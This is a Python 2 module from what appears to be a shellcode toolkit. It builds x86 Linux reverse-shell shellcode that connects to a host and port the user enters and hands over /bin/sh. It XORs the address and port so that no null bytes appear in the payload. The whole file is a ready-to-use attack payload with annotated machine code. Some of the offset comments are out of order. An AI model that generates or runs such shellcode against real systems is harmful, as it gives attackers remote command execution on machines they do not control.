############################################################################################
# title         : x86_linux_reverse-shell-tcp
# description   : Shellcode for x86 GNU/Linux systems that open a reverse shell over TCP
# author        : Leo 'cryptobioz' Depriester <leo.depriester@exadot.fr>
# date          : 2016/07/25
# version       : 1.0
#############################################################################################
import struct, socket
class Shellcode:
    @staticmethod
    def get():
        shellcode = Shellcode.shellcode
        
        # Define host
        host = raw_input("Host [127.0.0.1] : ")
        if not host:
            host = "127.0.0.1"
        try:
            address = host.split(".")
            for k,v in enumerate(address): address[k] = str(int(v) ^ 2)
            host = ".".join(address)
            host = socket.inet_aton(host)
        except socket.error:
            print "[-] This is not an IP adress."
            exit(1)
        
       
        shellcode = shellcode.replace(b"\xb8\x7f\x7f\x7f\x7f", b"\xb8"+host)
    
        # Define port
        port = raw_input("Port [4444] : ")
        if not port:
            port = 4444      
        port = struct.pack(">H", int(port) ^ 0x0202)
        if "\x00" in port:
            print "[-] The hex value of your port number (%s) contains \\x00." % port
            exit(1)
        else:
            shellcode = shellcode.replace(b"\x66\xb8\x41\x42", b"\x66\xb8"+port)
        

        return shellcode
        
    shellcode = (
        "\x31\xdb"               # 0x00000000:     xor ebx,ebx
        "\x53"                   # 0x00000002:     push ebx
        "\x43"                   # 0x00000003:     inc ebx
        "\x53"                   # 0x00000004:     push ebx
        "\x6a\x02"               # 0x00000005:     push byte +0x2
        "\x6a\x66"               # 0x00000007:     push byte +0x66
        "\x58"                   # 0x00000009:     pop eax
        "\x89\xe1"               # 0x0000000A:     mov ecx,esp
        "\xcd\x80"               # 0x0000000C:     int 0x80 ; socket()
        "\x93"                   # 0x0000000E:     xchg eax,ebx
        "\x59"                   # 0x0000000F:     pop ecx
        "\xb0\x3f"               # 0x00000010:     mov al,0x3f
        "\xcd\x80"               # 0x00000012:     int 0x80 ; dup2()
        "\x49"                   # 0x00000014:     dec ecx
        "\x79\xf9"               # 0x00000015:     jns 0x10
        "\x5b"                   # 0x00000017:     pop ebx
        "\x5a"                   # 0x00000018:     pop edx
        "\xb8\x7f\x7f\x7f\x7f"   # 0x00000019:     mov eax,0x7f7f7f7f
        "\x35\x02\x02\x02\x02"   # 0x00000020:     xor eax,0x02020202
        "\x50\x66"               # 0x00000025:     push eax
        "\x31\xc0"               # 0x00000027:     xor eax,eax
        "\x66\xb8\x41\x42"       # 0x00000029:     mov ax,0x4241
        "\x66\x35\x02\x02"       # 0x0000002D:     xor ax,0x0202
        "\x66\x50"               # 0x00000032:     push ax
        "\x31\xc0"               # 0x00000034:     xor eax,eax
        "\x43"                   # 0x00000036:     inc ebx
        "\x66\x53"               # 0x00000037:     push bx
        "\x89\xe1"               # 0x00000039:     mov ecx,esp
        "\xb0\x66"               # 0x0000003B:     mov al,0x66
        "\x50"                   # 0x0000003C:     push eax
        "\x51"                   # 0x0000003D:     push ecx
        "\x53"                   # 0x0000003E:     push ebx
        "\x89\xe1"               # 0x0000002C:     mov ecx,esp
        "\x43"                   # 0x0000002E:     inc ebx
        "\xcd\x80"               # 0x0000002F:     int 0x80 ; connect()
        "\x52"                   # 0x00000031:     push edx
        "\x68\x2f\x2f\x73\x68"   # 0x00000032:     push dword 0x68732f2f ; //sh
        "\x68\x2f\x62\x69\x6e"   # 0x00000037:     push dword 0x6e69622f ; /bin
        "\x89\xe3"               # 0x0000003C:     mov ebx,esp
        "\x52"                   # 0x0000003E:     push edx
        "\x53"                   # 0x0000003F:     push ebx
        "\x89\xe1"               # 0x00000040:     mov ecx,esp
        "\xb0\x0b"               # 0x00000042:     mov al,0xb
        "\xcd\x80"               # 0x00000044:     int 0x80 ; execve()    
    )
